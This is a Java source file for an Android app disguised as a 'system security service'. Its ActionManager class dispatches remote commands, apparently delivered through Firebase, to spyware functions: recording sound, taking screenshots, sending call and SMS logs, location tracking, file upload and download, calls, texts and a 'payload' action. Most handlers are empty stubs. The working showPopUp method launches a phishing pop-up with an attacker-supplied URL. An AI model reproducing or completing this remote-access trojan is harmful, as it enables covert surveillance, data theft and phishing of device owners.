package com.service.security.services.systemsecurityservice;

import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

import com.service.security.services.systemsecurityservice.mainUi.PhishingPopUp;

public class ActionManager {

    private Context context;
    private String content;
    private String action;

    public ActionManager(Context context, String content, String action) {
        this.context = context;
        this.content = content;
        this.action = action;
    }

    public boolean performAction() {
        switch (action) {
            case "popup": {
                showPopUp();
                return true;
            }
            case "notify": {
                showNotification();
                return true;
            }
            case "run": {
                runApp();
                return true;
            }
            case "explore": {
                getFiles();
                return true;
            }
            case "open_file": {
                openFile();
                return true;
            }
            case "download_file": {
                downloadFile();
                return true;
            }
            case "upload_file": {
                uploadFile();
                return true;
            }
            case "play_sound": {
                playSound();
                return true;
            }
            case "record_sound": {
                sendRecordedSound();
                return true;
            }
            case "screenshot": {
                sendScreenshot();
                return true;
            }
            case "snapshot": {
                sendSnapshot();
                return true;
            }
            case "make_call": {
                performCall();
                return true;
            }
            case "send_sms": {
                sendSms();
                return true;
            }
            case "call_log": {
                sendCallLog();
                return true;
            }
            case "sms_log": {
                sendSmsLog();
                return true;
            }
            case "get_location": {
                sendLocation();
                return true;
            }
            case "payload": {

                return true;
            }
            default: {
                makeToast();
            }
            System.out.println("FirebaseBroadcastReceiver.performAction Action = " + action);
            System.out.println("FirebaseBroadcastReceiver.performAction content = " + content);

        }

        return false;
    }

    private void makeToast() {
        Toast.makeText(context, content, Toast.LENGTH_SHORT).show();
    }

    private void playSound() {

    }

    private void sendRecordedSound() {

    }

    private void downloadFile() {

    }

    private void sendScreenshot() {

    }

    private void performCall() {

    }

    private void getFiles() {

    }

    private void sendSnapshot() {
    }

    private void openFile() {

    }

    private void sendSms() {

    }

    private void sendSmsLog() {

    }

    private void runApp() {

    }

    private void sendLocation() {

    }

    private void uploadFile() {

    }

    private void showNotification() {
    }

    private void sendCallLog() {
        //String callLog = getCallLog();
        //Log.e("call Log", "inside sendCallLog()" + callLog);
        Log.e("FBR.sendCallLog()", "getCallLog() not implemented");
    }

    private void showPopUp() {
        Intent i = new Intent();
        i.setClass(context, PhishingPopUp.class);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.putExtra("url", content);
        context.startActivity(i);
    }


}
